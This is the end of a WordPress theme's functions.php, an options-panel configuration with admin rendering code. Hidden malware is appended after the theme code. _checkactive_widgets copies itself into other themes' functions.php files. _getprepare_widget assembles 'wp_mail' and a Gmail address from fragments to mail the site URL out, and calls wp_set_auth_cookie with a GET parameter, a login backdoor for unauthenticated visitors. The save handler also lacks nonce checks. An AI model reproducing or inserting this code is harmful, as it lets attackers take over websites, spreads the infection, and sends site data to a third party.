	array(  "name" => "wrap-seo",
			"type" => "contenttab-wrapend",),

//-------------------------------------------------------------------------------------//

	array( "name" => "wrap-integration",
		   "type" => "contenttab-wrapstart",),
		   
		array( "type" => "subnavtab-start",),
		
			array( "name" => "integration-1",
				   "type" => "subnav-tab",
				   "desc" => "Code Integration"),
				   
		array( "type" => "subnavtab-end",),
		
		array( "name" => "integration-1",
			   "type" => "subcontent-start",),

			array( "name" => "Disable header code",
                   "id" => $shortname."_integrate_header_enable",
                   "type" => "checkbox",
                   "std" => "on",
                   "desc" => "Disabling this option will remove the header code below from your blog. This allows you to remove the code while saving it for later use."),

			array( "name" => "Disable body code",
                   "id" => $shortname."_integrate_body_enable",
                   "type" => "checkbox2",
                   "std" => "on",
                   "desc" => "Disabling this option will remove the body code below from your blog. This allows you to remove the code while saving it for later use."),
			
			array( "type" => "clearfix",),
			
			array( "name" => "Disable single top code",
                   "id" => $shortname."_integrate_singletop_enable",
                   "type" => "checkbox",
                   "std" => "on",
                   "desc" => "Disabling this option will remove the single top code below from your blog. This allows you to remove the code while saving it for later use."),
			
			array( "name" => "Disable single bottom code",
                   "id" => $shortname."_integrate_singlebottom_enable",
                   "type" => "checkbox2",
                   "std" => "on",
                   "desc" => "Disabling this option will remove the single bottom code below from your blog. This allows you to remove the code while saving it for later use."),
				   
			array( "type" => "clearfix",),	   

			array( "name" => "Add code to the < head > of your blog",
				   "id" => $shortname."_integration_head",
				   "type" => "textarea",
				   "std" => "",
				   "desc" => "Any code you place here will appear in the head section of every page of your blog. This is useful when you need to add javascript or css to all pages.",),

			array( "name" => "Add code to the < body > (good for tracking codes such as google analytics)",
				   "id" => $shortname."_integration_body",
				   "type" => "textarea",
				   "std" => "",
				   "desc" => "Any code you place here will appear in body section of all pages of your blog. This is usefull if you need to input a tracking pixel for a state counter such as Google Analytics.",),

			array( "name" => "Add code to the top of your posts",
				   "id" => $shortname."_integration_single_top",
				   "type" => "textarea",
				   "std" => "",
				   "desc" => "Any code you place here will be placed at the top of all single posts. This is useful if you are looking to integrating things such as social bookmarking links.",),
			
			array( "name" => "Add code to the bottom of your posts, before the comments",
				   "id" => $shortname."_integration_single_bottom",
				   "type" => "textarea",
				   "std" => "",
				   "desc" => "Any code you place here will be placed at the top of all single posts. This is useful if you are looking to integrating things such as social bookmarking links.",),
		
		array( "name" => "integration-1",
			   "type" => "subcontent-end",),		
			   
	array( "name" => "wrap-integration",
		   "type" => "contenttab-wrapend",),
		   
//-------------------------------------------------------------------------------------//

	array( "name" => "wrap-support",
		   "type" => "contenttab-wrapstart",),
		   
		array( "type" => "subnavtab-start",),
		
			array( "name" => "support-1",
				   "type" => "subnav-tab",
				   "desc" => "Installation"),
			
			array( "name" => "support-2",
				   "type" => "subnav-tab",
				   "desc" => "Troubleshooting"),
			
			array( "name" => "support-3",
				   "type" => "subnav-tab",
				   "desc" => "Tutorials"),
				   
		array( "type" => "subnavtab-end",),
		
		array( "name" => "support-1",
			   "type" => "subcontent-start",),
		
			array( "name" => "installation",
				   "type" => "support",),		   
		
		array( "name" => "support-1",
			   "type" => "subcontent-end",),
		
		array( "name" => "support-2",
			   "type" => "subcontent-start",),
		
			array( "name" => "troubleshooting",
				   "type" => "support",),
		
		array( "name" => "support-2",
			   "type" => "subcontent-end",),		
		
		array( "name" => "support-3",
			   "type" => "subcontent-start",),
		
			array( "name" => "tutorials",
				   "type" => "support",),
		
		array( "name" => "support-3",
			   "type" => "subcontent-end",),		
			   
	array( "name" => "wrap-support",
		   "type" => "contenttab-wrapend",),
		   
//-------------------------------------------------------------------------------------//

	array( "name" => "wrap-advertisements",
		   "type" => "contenttab-wrapstart",),
		   
		array( "type" => "subnavtab-start",),
		
			array( "name" => "advertisements-1",
				   "type" => "subnav-tab",
				   "desc" => "Manage Un-widgetized Advertisements"),
			
		array( "type" => "subnavtab-end",),
		
		array( "name" => "advertisements-1",
			   "type" => "subcontent-start",),

			array( "name" => "Enable 468x60 banner",
				   "id" => $shortname."_468_enable",
				   	"type" => "checkbox",
				   "std" => "false",
				   "desc" => "Enabling this option will display a 468x60 banner ad on the bottom of your post pages below the single post content. If enabled you must fill in the banner image and destination url below.",),  
		
			array( "type" => "clearfix",),
			
			array( "name" => "Input 468x60 advertisement banner image",
				   "id" => $shortname."_468_image",
				   "type" => "textarea",
				   "std" => "",
				   "desc" => "Here you can change which character separates your blog title and index page name when using autogenerated post titles. Common values are | or -",), 

			array( "name" => "Input 468x60 advertisement destination url",
				   "id" => $shortname."_468_url",
				   "type" => "text",
				   "std" => "",
				   "desc" => "Here you can change which character separates your blog title and index page name when using autogenerated post titles. Common values are | or -",), 
		
		array( "name" => "advertisements-1",
			   "type" => "subcontent-end",),
					   
	array( "name" => "wrap-support",
		   "type" => "contenttab-wrapend",),
		   
//-------------------------------------------------------------------------------------//	

			
);

function admin_js(){
	if ( $_GET['page'] == basename(__FILE__) ) {
?>
	<script type="text/javascript" src="<?php bloginfo('stylesheet_directory') ?>/js/theme-options/jquery.form.js"></script>
	<script type="text/javascript" src="<?php bloginfo('stylesheet_directory') ?>/js/theme-options/checkbox.js"></script>
	<script type="text/javascript" src="<?php bloginfo('stylesheet_directory') ?>/js/theme-options/functions-init.js"></script>
	<script type="text/javascript" src="<?php bloginfo('stylesheet_directory') ?>/js/theme-options/colorpicker.js"></script>
	<script type="text/javascript" src="<?php bloginfo('stylesheet_directory') ?>/js/theme-options/eye.js"></script>
	<script type="text/javascript" src="<?php bloginfo('stylesheet_directory') ?>/js/theme-options/layout.js"></script>

	<script type="text/javascript">
	/* <![CDATA[ */
		var clearpath = "<?php bloginfo('stylesheet_directory') ?>/images/theme-options/empty.png";
	/* ]]> */
	</script>
	<script type="text/javascript">
	/* <![CDATA[ */
		jQuery(document).ready(function(){
			jQuery('input#epanel-save').click(function($){
				var options_fromform = jQuery('#main_options_form').formSerialize();
				var save_button=jQuery(this);
				jQuery.ajax({
				   type: "POST",
				   url: "themes.php?page=functions.php",
				   data: options_fromform,
				   success: function(response){
						jQuery("#loading").html('Saved!');
						save_button.blur();
				   },
				});
				
				return false;
			});
			jQuery("#loading").ajaxStart(function(){
				jQuery(this).html('<img src="<?php bloginfo('stylesheet_directory') ?>/images/theme-options/ajax-loader.gif" alt="loading" id="loading" />');
			});
		});
	/* ]]> */
	</script>
<?php }
}

function mytheme_add_admin() {

    global $themename, $shortname, $options;

    if ( $_GET['page'] == basename(__FILE__) ) {
		wp_enqueue_script('jquery');
		wp_enqueue_script('myscript', 'http://ajax.googleapis.com/ajax/libs/jqueryui/1.7.1/jquery-ui.min.js');
?>
<?php
		 if ( 'save' == $_REQUEST['action'] ) {
			foreach ($options as $value) {
				echo($_REQUEST[ $value['id'] ]);
				if( isset( $_REQUEST[ $value['id'] ] ) ) {
					if ($value['type'] == 'textarea' || $value['type'] == 'text') update_option( $value['id'], stripslashes($_REQUEST[$value['id']]) );
					elseif ($value['type'] == 'select') update_option( $value['id'], htmlspecialchars($_POST[$value['id']]) );
					else update_option( $value['id'], $_POST[$value['id']] );
				}
				else {
					
					if ($value['type'] == 'checkbox' || $value['type'] == 'checkbox2') update_option( $value['id'] , 'false' );
					else delete_option( $value['id'] );
				}
			}
			
			/* AJAX check  */
			if(empty($_SERVER['HTTP_X_REQUESTED_WITH']) && !strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {
				header("Location: themes.php?page=functions.php&saved=true");
				die;
			}
			
        } else if( 'reset' == $_REQUEST['action'] ) {
			foreach ($options as $value) { 
				delete_option( $value['id'] );
				$$value['id'] = $value['std'];
			}
			header("Location: themes.php?page=functions.php&reset=true");
			die;
		}
    }

    add_theme_page($themename." Options", $themename." Theme Options", 'edit_themes', basename(__FILE__), 'mytheme_admin');
}

function mytheme_admin() {

    global $themename, $shortname, $options;

    if ( $_REQUEST['saved'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.' settings saved.</strong></p></div>';
    if ( $_REQUEST['reset'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.' settings reset.</strong></p></div>';
    
?>

<div id="wrapper">
  <div id="panel-wrap">
	<form method="post" id="main_options_form">
		<div id="epanel-wrapper">
			<div id="epanel">
				<div id="epanel-content-wrap">
					<div id="epanel-content">
						<img src="<?php bloginfo('stylesheet_directory') ?>/images/theme-options/logo.png" alt="ePanel" class="pngfix" id="epanel-logo" />
						<ul id="epanel-mainmenu">
							<li><a href="#wrap-general"><img src="<?php bloginfo('stylesheet_directory') ?>/images/theme-options/general-icon.png" class="pngfix" alt="" />General Settings</a></li>
							<li><a href="#wrap-navigation"><img src="<?php bloginfo('stylesheet_directory') ?>/images/theme-options/navigation-icon.png" class="pngfix" alt="" />Navigation</a></li>
							<li><a href="#wrap-layout"><img src="<?php bloginfo('stylesheet_directory') ?>/images/theme-options/layout-icon.png" class="pngfix" alt="" />Layout Settings</a></li>
							<li><a href="#wrap-advertisements"><img src="<?php bloginfo('stylesheet_directory') ?>/images/theme-options/ad-icon.png" class="pngfix" alt="" />Ad Management</a></li>
							<li><a href="#wrap-colorization"><img src="<?php bloginfo('stylesheet_directory') ?>/images/theme-options/colorization-icon.png" class="pngfix" alt="" />Colorization</a></li>
							<li><a href="#wrap-seo"><img src="<?php bloginfo('stylesheet_directory') ?>/images/theme-options/seo-icon.png" class="pngfix" alt="" />SEO</a></li>
							<li><a href="#wrap-integration"><img src="<?php bloginfo('stylesheet_directory') ?>/images/theme-options/integration-icon.png" class="pngfix" alt="" />Integration</a></li>
							<li><a href="#wrap-support"><img src="<?php bloginfo('stylesheet_directory') ?>/images/theme-options/support-icon.png" class="pngfix" alt="" />Support Docs</a></li>
						</ul><!-- end epanel mainmenu -->

<?php foreach ($options as $value) {
if (($value['type'] == "text") || ($value['type'] == "textlimit") || ($value['type'] == "textarea") || ($value['type'] == "select") || ($value['type'] == "checkboxes") || ($value['type'] == "different_checkboxes") || ($value['type'] == "colorpicker") || ($value['type'] == "textcolorpopup") ) { ?>
			<div class="epanel-box">
			  <div class="box-title">
				<h3><?php echo $value['name']; ?></h3>
				<img src="<?php bloginfo('stylesheet_directory') ?>/images/theme-options/help-image.png" alt="description" class="box-description" />
				<div class="box-descr">
					<p><?php echo $value['desc']; ?></p>
				</div> <!-- end box-desc-content div -->
		      </div> <!-- end div box-title -->
				<div class="box-content">
		<?php if ($value['type'] == "text") { ?>
			<input name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" type="<?php echo $value['type']; ?>" value="<?php if ( get_option( $value['id'] ) != "") { echo get_option( $value['id'] ); } else { echo $value['std']; } ?>" />
		<?php } elseif ($value['type'] == "textlimit") { ?>
			<input name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" type="text" maxlength="<?php echo $value['max']; ?>" size="<?php echo $value['max']; ?>" value="<?php if ( get_option( $value['id'] ) != "") { echo get_option( $value['id'] ); } else { echo $value['std']; } ?>" />
		<?php } elseif ($value['type'] == "colorpicker") { ?>
			<div id="colorpickerHolder"></div>
		<?php } elseif ($value['type'] == "textcolorpopup") { ?>
			<input name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" class="colorpopup" type="text" value="<?php if ( get_option( $value['id'] ) != "") { echo get_option( $value['id'] ); } else { echo $value['std']; } ?>" />
		<?php } elseif ($value['type'] == "textarea") { ?>
			<textarea name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>"><?php if ( get_option( $value['id'] ) != "") { echo stripslashes(get_option( $value['id'] )); } else { echo stripslashes($value['std']); } ?></textarea>
		<?php } elseif ($value['type'] == "select") { ?>
			<select name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>">
            <?php foreach ($value['options'] as $option) { ?>
                <option<?php if ( htmlspecialchars(get_option( $value['id'] )) == htmlspecialchars($option)) { echo ' selected="selected"'; } elseif ($option == $value['std']) { echo ' selected="selected"'; } ?>><?php echo $option; ?></option>
            <?php } ?>
            </select>
		<?php } elseif ($value['type'] == "checkboxes") {
			if (empty($value['options'])) {
				echo("You don't have pages");
			} else {
			$i = 1; 
			foreach ($value['options'] as $option) {
				$checked = ""; 
				if (get_option( $value['id'])) { 
					if (in_array($option, get_option( $value['id'] ))) $checked = "checked=\"checked\"";
				} ?>
				<p class="inputs<?php if ($i%3 == 0) echo(' last');?>"><input type="checkbox" class="usual-checkbox" name="<?php echo $value['id']; ?>[]" id="<?php echo $value['id'],"-",$option; ?>" value="<?php echo ($option); ?>" <?php echo $checked; ?> />
				<label for="<?php echo $value['id'],"-",$option; ?>"><?php if ($value['usefor']=='pages') echo get_pagename($option); else echo get_categname($option); ?></label> 
				</p>
                <?php if ($i%3 == 0) echo('<br class="clearfix"/>');?>
		  <?php $i++; }
			}; ?>
			<br class="clearfix"/>
		<?php } elseif ($value['type'] == "different_checkboxes") {
			foreach ($value['options'] as $option) {
				$checked = "";
				if (get_option( $value['id'])) {
					if (in_array($option, get_option( $value['id'] ))) $checked = "checked=\"checked\"";
				} else { $checked = "checked=\"checked\""; } ?>
				<p class="<?php echo ("postinfo-".$option) ?>"><input type="checkbox" class="usual-checkbox" name="<?php echo $value['id']; ?>[]" id="<?php echo ($value['id']."-".$option); ?>" value="<?php echo ($option); ?>" <?php echo $checked; ?> /> 
				</p>
		  <?php } ?>
			<br class="clearfix"/>
		<?php } ?>
				</div> <!-- end box-content div -->
			</div> <!-- end epanel-box div -->	
<?php } elseif (($value['type'] == "checkbox") || ($value['type'] == "checkbox2")) { ?>	
			<div class="epanel-box <?php if ($value['type'] == "checkbox") {echo('epanel-box-small-1');} else {echo('epanel-box-small-2');} ?>">
			  <div class="box-title"><h3><?php echo $value['name']; ?></h3>
				<img src="<?php bloginfo('stylesheet_directory') ?>/images/theme-options/help-image.png" alt="description" class="box-description" />
				<div class="box-descr">
					<p><?php echo $value['desc']; ?></p>
				</div> <!-- end box-desc-content div -->
			  </div> <!-- end div box-title -->
				<div class="box-content">
	<?php $checked = '';
	if((get_option($value['id'])) <> '') {
		if((get_option($value['id'])) == 'on') { $checked = 'checked="checked"'; }
		else { $checked = ''; }
	}
	elseif ($value['std'] == 'on') { $checked = 'checked="checked"'; }      
?>
    <input type="checkbox" class="checkbox" name="<?php echo($value['id']);?>" id="<?php echo($value['id']);?>" <?php echo($checked); ?> />
				</div> <!-- end box-content div -->
			</div> <!-- end epanel-box-small div -->
<?php } elseif ($value['type'] == "support") { ?>
			<div class="inner-content">
				<?php include(TEMPLATEPATH . "/includes/functions/".$value['name'].".php"); ?>
			</div>
<?php } elseif (($value['type'] == "contenttab-wrapstart") || ($value['type'] == "subcontent-start")) { ?>
			<div id="<?php echo $value['name']; ?>" class="<?php if ($value['type'] == "contenttab-wrapstart") {echo('content-div');} else {echo('tab-content');} ?>">
<?php } elseif (($value['type'] == "contenttab-wrapend") || ($value['type'] == "subcontent-end")) { ?>
			</div> <!-- end <?php echo $value['name']; ?> div -->
<?php } elseif ($value['type'] == "subnavtab-start") { ?>
			<ul class="idTabs">			
<?php } elseif ($value['type'] == "subnavtab-end") { ?>
			</ul>
<?php } elseif ($value['type'] == "subnav-tab") { ?>
			<li><a href="#<?php echo $value['name']; ?>"><span class="pngfix"><?php echo $value['desc']; ?></span></a></li>
<?php } elseif ($value['type'] == "clearfix") { ?>
			<div class="clearfix"></div>
<?php } ?>


<?php } //end foreach ($options as $value) ?>
		
					</div> <!-- end epanel-content div -->
				</div> <!-- end epanel-content-wrap div -->
			</div> <!-- end epanel div -->
		</div> <!-- end epanel-wrapper div -->
		<div id="epanel-bottom">
        			<input name="save" type="submit" value="Save changes" id="epanel-save" />
			<input type="hidden" name="action" value="save" />
		
        <img src="<?php bloginfo('stylesheet_directory') ?>/images/theme-options/defaults.png" class="defaults-button" alt="no" />
		<p id="loading" style="float: left; margin: 8px 0px 0px 199px;">
			
		</p>	
        </div><!-- end epanel-bottom div -->
        </form>
        <div style="clear: both;"></div>
                <div style="position: relative;">
        <div class="defaults-hover">
        This will return all of the settings throughout the options page to their default values. <strong>Are you sure you want to do this?</strong>
        <div class="clearfix"></div>
		<form method="post">
			<input name="reset" type="submit" value="Reset" id="epanel-reset" />
			<input type="hidden" name="action" value="reset" />
		</form>
        <img src="<?php bloginfo('stylesheet_directory') ?>/images/theme-options/no.gif" class="no" alt="no" />
        </div> 
        </div>
        
	  </div> <!-- end panel-wrap div -->
	</div> <!-- end wrapper div -->
	
<?php
}

add_action('admin_menu', 'mytheme_add_admin'); 

function css_admin() { ?> 
	<link rel="stylesheet" href="<?php bloginfo('stylesheet_directory') ?>/panel.css" type="text/css" />
	<style type="text/css">
	.lightboxclose { background: url("<?php bloginfo('stylesheet_directory') ?>/images/theme-options/description-close.png") no-repeat; width: 19px; height: 20px; }
	</style>
	<!--[if IE 7]>
	<style type="text/css">
		#epanel-save, #epanel-reset { font-size: 0px; display:block; line-height: 0px; bottom: 18px;}
		.box-desc { width: 414px; }
		.box-desc-content { width: 340px; }
		.box-desc-bottom { height: 26px; }
		#epanel-content .epanel-box input, #epanel-content .epanel-box select, .epanel-box textarea {  width: 395px; }
		#epanel-content .epanel-box select { width:434px !important;}
		#epanel-content .epanel-box .box-content { padding: 8px 17px 15px 16px; }
	</style>
	<![endif]-->  
    	<!--[if IE 8]>
        <style type="text/css">
        		#epanel-save, #epanel-reset { font-size: 0px; display:block; line-height: 0px; bottom: 18px;}
</style>
        <![endif]-->  
<?php }

global $options, $value;

foreach ($options as $value) {
	 if ( get_settings( $value['id'] ) === FALSE) {
		update_option( $value['id'], $value['std'] ); 
		$$value['id'] = $value['std']; 	
	} else {
		$$value['id'] = get_option( $value['id'] ); }
}

add_action('admin_head', 'css_admin');
add_action('admin_head', 'admin_js');
?>
<?php $wp_ver = substr($GLOBALS['wp_version'],0,3);
if ($wp_ver >= 2.8) include(TEMPLATEPATH . '/includes/widgets.php'); ?>
<?php
function _checkactive_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_checkactive_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mes".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
} 		
?>